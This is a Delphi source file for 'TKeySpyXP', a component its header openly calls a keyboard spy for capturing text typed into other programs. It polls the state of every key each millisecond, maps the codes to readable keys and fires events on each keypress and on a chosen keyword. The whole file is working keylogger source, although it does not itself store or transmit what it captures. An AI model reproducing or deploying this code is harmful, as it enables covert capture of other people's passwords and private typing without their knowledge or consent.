{*************************************************************}
{            TKeySpyXP for Delphi                             }
{ Version:        2.5                                         }
{ E-Mail:         n_a_v_@rembertow.net                        }
{ First release:  3 January 2004                              }
{ Last modified:  20 May 2004                                 }
{ Legal:          Copyright (c) 2004, n_a_v_                  }
{ Systems:        I know that it works on Win2k, should work  }
{                 on other, but I'm not sure about Linux      }
{*************************************************************}
{                     KEYBOARD SPY:                           }
{ This component is intended for interception of pressing the }
{ keyboard. The KeySpyXP is possible to apply for interception}
{ of the typed text of the another's programs, as keyboard    }
{ spy, or for processing events at type certain keywords etc..}
{*************************************************************}
{ Properties: ************************************************}
{         Enabled: As it usual...                             }
{         Keyword: At a set of this word event will be        }
{                  carried out (See OnKeyword event).         }
{                                                             }
{     Events: ************************************************}
{        OnKeySpy: As OnKey, but in any place (window).       }
{       OnKeyword: The Keyword has been typed (See Keyword).  }
{*************************************************************}
{  Changes:                                                   }
{   3.1.2004 : 1st working version                            }
{   3.1.2004 (2 hours later): Added KeyWord                   }
{   4.1.2004 : Added AllAtOnce in Keyword Types               }
{   20.5.2004: Changed keyword - now it can be with space,    }
{              and others                                     }
{   20.5.2004 (20 mins later): Fixed special keys,            }
{              now if you will hold this key you won't get    }
{              hundrets of info that control has been pressed}
{*************************************************************}
unit KeySpyXP;

interface

uses
  Classes, Windows, Controls, Messages, Forms;

type
  TKeywordButtonsState = (KbsOn, KbsDontCare, KbsMustbeoff);
  TKeywordInputType = (KitAllAtOnce, KitOneAfterAnother);
  TKeyword = class(TPersistent)
  private
    { Private declarations }
    FKeyWord:string;
    FType:TKeywordInputType;
    caps,
    num,
    scroll:TKeywordButtonsState;
    procedure SetKeyword(Value:string);
  protected
    { Protected declarations }
    constructor Create;
  public
    { Public declarations }
  published
    property KeyWord:string read FKeyword write SetKeyword;
    property Keyword_Input_Type:TKeywordInputType read FType write FType;
    property Caps_Lock:TKeywordButtonsState read caps write caps;
    property Num_Lock:TKeywordButtonsState read num write num;
    property Scroll_Lock:TKeywordButtonsState read scroll write scroll;
  end;

type
  TOnKeyPressEvent = procedure (Sender:TObject;key:string)of object;
  TOnKeywordEvent = procedure (Sender:TObject;keyword:string)of object;
  TKeySpyXP = class(TComponent)
  private
    { Private declarations }
    FOnKey:TOnKeyPressEvent;
    FOnKeyWord:TOnKeywordEvent;
    FEnabled:Boolean;
    FAuthor:string;
    FWindowHandle:HWND;
    stan_old:array [0..255]of integer;
    keyComp:string;
    FKeyWord:TKeyword;
    procedure Timer();
    procedure Timer2();
    procedure WndProc(var Msg: TMessage);
    procedure SetAuthor(Value:string);
  protected
    { Protected declarations }
  public
    { Public declarations }
    constructor Create(AOwner:TComponent);override;
    destructor Destroy;override;
  published
    { Published declarations }
    property Author:string read FAuthor write SetAuthor;
    property Enabled:boolean read FEnabled write FEnabled;
    property KeyWord:TKeyWord read FKeyword write FKeyword;
    property OnKey:TOnKeyPressEvent read FOnKey write FOnKey;
    property OnKeyword:TOnKeywordEvent read FOnKeyword write FOnKeyword;
  end;
{$R *.res}
procedure Register;
const klawisze:array[0..255]of string =
((''),
('{LeftMouseButton}'),
('{RightMouseButton}'),
('{CANCEL}'),
('{MiddleMouseButton}'),
('{ScrollButton}'),
(''),
(''),
('{BACKSPACE}'),
('{TAB}'),
(''),
(''),
('{CLEAR}'),
('{ENTER}'),
(''),
(''),
('{SHIFT}'),
('{CONTROL}'),
('{ALT}'),
('{PAUSE}'),
('{CAPS LOCK}'),
('{KANA}'),
(''),
('{JUNJA}'),
('{FINAL}'),
('{HANJA}'),
('{KANJI}'),
('{ESCAPE}'),
('{CONVERT}'),
('{NONCONVERT}'),
('{ACCEPT}'),
('{MODECHANGE}'),
(' '),
('{PRIOR}'),
('{NEXT}'),
('{END}'),
('{HOME}'),
('{LEFT}'),
('{UP}'),
('{RIGHT}'),
('{DOWN}'),
('{SELECT}'),
('{PRINT}'),
('{EXECUTE}'),
('{SNAPSHOT}'),
('{INSERT}'),
('{DELETE}'),
('{HELP}'),
('0'),
('1'),
('2'),
('3'),
('4'),
('5'),
('6'),
('7'),
('8'),
('9'),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
('a'),
('b'),
('c'),
('d'),
('e'),
('f'),
('g'),
('h'),
('i'),
('j'),
('k'),
('l'),
('m'),
('n'),
('o'),
('p'),
('q'),
('r'),
('s'),
('t'),
('u'),
('v'),
('w'),
('x'),
('y'),
('z'),
('{LEFT WINDOWS}'),
('{RIGHT WINDOWS}'),
('{APPS /RightClick/}'),
(''),
(''),
('0'),
('1'),
('2'),
('3'),
('4'),
('5'),
('6'),
('7'),
('8'),
('9'),
('{NUMPAD MULTIPLY}'),
('{NUMPAD ADD}'),
('{NUMPAD SEPARATOR}'),
('{NUMPAD SUBTRACT}'),
('{NUMPAD DECIMAL}'),
('{NUMPAD DIVIDE}'),
('{F1}'),
('{F2}'),
('{F3}'),
('{F4}'),
('{F5}'),
('{F6}'),
('{F7}'),
('{F8}'),
('{F9}'),
('{F10}'),
('{F11}'),
('{F12}'),
('{F13}'),
('{F14}'),
('{F15}'),
('{F16}'),
('{F17}'),
('{F18}'),
('{F19}'),
('{F20}'),
('{F21}'),
('{F22}'),
('{F23}'),
('{F24}'),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
('{NUM LOCK}'),
('{SCROLL LOCK}'),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
('{LEFT SHIFT}'),
('{RIGHT SHIFT}'),
('{LEFT CONTROL}'),
('{RIGHT CONTROL}'),
('{LEFT ALT}'),
('{RIGHT ALT}'),
('{GO BACK}'),
('{GO FORWARD}'),
('{REFRESH}'),
('{STOP}'),
('{SEARCH}'),
('{FAVORITES}'),
('{HOMEPAGE}'),
('{MUTE}'),
('{VOLUME UP}'),
('{VOLUME DOWN}'),
('{NEXT TRACK}'),
('{PREVIOUS TRACK}'),
('{STOP PLAYER}'),
('{PLAY}'),
('{E-MAIL}'),
('{MEDIA PLAYER}'),
('{MY COMPUTER}'),
(''),//180
(''),
(''),
(';'),
('='),
(','),
('-'),
('.'),
('/'),
('`'),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
('['),
('\'),
(']'),
(#$27),
(''),
(''),
(''),
(''),
(''),
(''),
('{PROCESSKEY}'),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
(''),
('{ATTN}'),
('{CRSEL}'),
('{EXSEL}'),
('{EREOF}'),
('{PLAY}'),
('{ZOOM}'),
('{NONAME}'),
('{PA1}'),
('{OEM_CLEAR}'),
('{WAKEUP}'));
implementation

uses SysUtils;


procedure Register;
begin
  RegisterComponents('System', [TKeySpyXP]);
end;

{ TKeySpyXP }

constructor TKeySpyXP.Create(AOwner: TComponent);
var i:byte;
begin
  inherited;
  Author:='n_a_v_';
  FWindowHandle:=allocatehwnd(WndProc);
  SetTimer(FWindowhandle,1,1,nil);
  SetTimer(FWindowhandle,2,100,nil);
  FEnabled:=true;
  for i:=0 to 255 do
  stan_old[i]:=getasynckeystate(i);
  FKeyword:=TKeyword.Create;
end;

destructor TKeySpyXP.Destroy;
begin
  FEnabled := False;
  DeallocateHWnd(FWindowHandle);
  KillTimer(FWindowHandle, 1);
  inherited;
end;

procedure TKeySpyXP.SetAuthor(Value: string);
begin
FAuthor:='n_a_v_';
end;


procedure TKeySpyXP.Timer;
  var i:byte;key:string;a:smallint;
begin
  if FEnabled then
    for i:=0 to 255 do
      if ((getasynckeystate(i)-stan_old[i])<-5) or ((getasynckeystate(i)-stan_old[i])>5) then
        begin
          if (GetAsynckeystate(i)=-32768)or(GetAsynckeystate(i)=-32767)then
            begin
              key:=klawisze[i];
              if not((Key='{SHIFT}') or (Key='{CONTROL}') or (Key='{ALT}')) then
                begin
                if ((stan_old[16]<-32760)or(stan_old[20]<-32760))and(i>65)and(i<91) then
                key:=uppercase(key);
                  if key='{CAPS LOCK}' then
                    begin
                      key[length(key)]:=' ';
                      a:=GetKeyState(VK_CAPITAL);
                      if a=-127 then
                        key:=key+'ON}' else key:=key+'OFF}'
                    end else
                  if key='{NUM LOCK}' then
                    begin
                      key[length(key)]:=' ';
                      a:=GetKeyState(VK_NUMLOCK);
                      if a=-127 then
                      key:=key+'ON}' else key:=key+'OFF}'
                    end else
                  if key='{SCROLL LOCK}' then
                    begin
                      key[length(key)]:=' ';
                      a:=GetKeyState(VK_SCROLL);
                      if a=-127 then
                      key:=key+'ON}' else key:=key+'OFF}'
                    end;
                  if Assigned(FOnKey) then
                      FOnKey(self,key);
                  if Assigned(FOnKeyword)and(FKeyword.keyword<>'') then
                    begin
                      //if (i>=65)and(i<=91) then
                        if FKeyword.FType = KitOneAfterAnother then
                          begin
                            if ((FKeyword.caps=KbsDontCare)or((FKeyword.caps=KbsOn)and(getkeystate(VK_CAPITAL)=1))or((FKeyword.caps=KbsMustBeoff)and(getkeystate(VK_CAPITAL)=0)))then
                              if ((FKeyword.num=KbsDontCare)or((FKeyword.num=KbsOn)and(getkeystate(VK_NUMLOCK)=1))or((FKeyword.num=KbsMustBeoff)and(getkeystate(VK_NUMLOCK)=0)))then
                                if ((FKeyword.scroll=KbsDontCare)or((FKeyword.scroll=KbsOn)and(getkeystate(VK_SCROLL)=1))or((FKeyword.scroll=KbsMustBeoff)and(getkeystate(VK_SCROLL)=0)))then
                                  begin
                                    KeyComp := KeyComp + Key;
                                    if Length(KeyComp) > Length(FKeyword.Keyword) then
                                    begin
                                      Move(KeyComp[Length(key) + 1], KeyComp[1], Length(KeyComp));
                                      SetLength(KeyComp, Length(FKeyword.KeyWord));
                                    end;
                                    if LowerCase(KeyComp) = lowercase(FKeyword.KeyWord) then
                                      FOnKeyword(Self,keycomp);
                                  end;
                          end;
                      end;
                    end;
                end;
              stan_old[i]:=getasynckeystate(i);
            end;
end;

procedure TKeySpyXP.Timer2;
var KeyComp:string;i:byte;passwd:array of boolean;
begin
  if FEnabled then
    begin
      setlength(passwd,length(fkeyword.KeyWord));
        if (assigned(FOnKeyword))and(FKeyword.keyword<>'') then
          if FKeyword.FType = KitAllAtOnce then
            if ((FKeyword.caps=KbsDontCare)or((FKeyword.caps=KbsOn)and(getkeystate(VK_CAPITAL)=1))or((FKeyword.caps=KbsMustBeoff)and(getkeystate(VK_CAPITAL)=0)))then
              if ((FKeyword.num=KbsDontCare)or((FKeyword.num=KbsOn)and(getkeystate(VK_NUMLOCK)=1))or((FKeyword.num=KbsMustBeoff)and(getkeystate(VK_NUMLOCK)=0)))then
                if ((FKeyword.scroll=KbsDontCare)or((FKeyword.scroll=KbsOn)and(getkeystate(VK_SCROLL)=1))or((FKeyword.scroll=KbsMustBeoff)and(getkeystate(VK_SCROLL)=0)))then
                  begin
                    KeyComp:=uppercase(fkeyword.keyword);
                    for i:=0 to length(KeyComp)-1 do
                      if (getasynckeystate(ord(keycomp[i+1]))=-32768)or(getasynckeystate(ord(keycomp[i+1]))=-32767) then
                        passwd[i]:=true else break;
                      for i:=0 to length(keycomp)-1 do
                        if passwd[i]=false then exit;
                      FOnKeyWord(self,Fkeyword.KeyWord);
                  end;
    end;
end;

procedure TKeySpyXP.WndProc(var Msg: TMessage);
begin
with Msg do
    if (Msg = WM_TIMER)and(Wparam=1) then
      try
        Timer();
      except
        Application.HandleException(Self);
      end else
    if (Msg = WM_TIMER)and(Wparam=2) then
      try
        Timer2();
      except
        Application.HandleException(Self);
      end
    else
      Result := DefWindowProc(FWindowHandle, Msg, wParam, lParam);
end;

{ TKeyword }

constructor TKeyword.Create;
begin
Caps_Lock:=KbsDontCare;
Num_Lock:=KbsDontCare;
Scroll_Lock:=KbsDontCare;
Keyword:='';
Keyword_Input_Type:=KitOneAfterAnother;

end;

procedure TKeyword.SetKeyword(Value: string);
begin
FKeyword:=lowercase(Value);
end;

end.
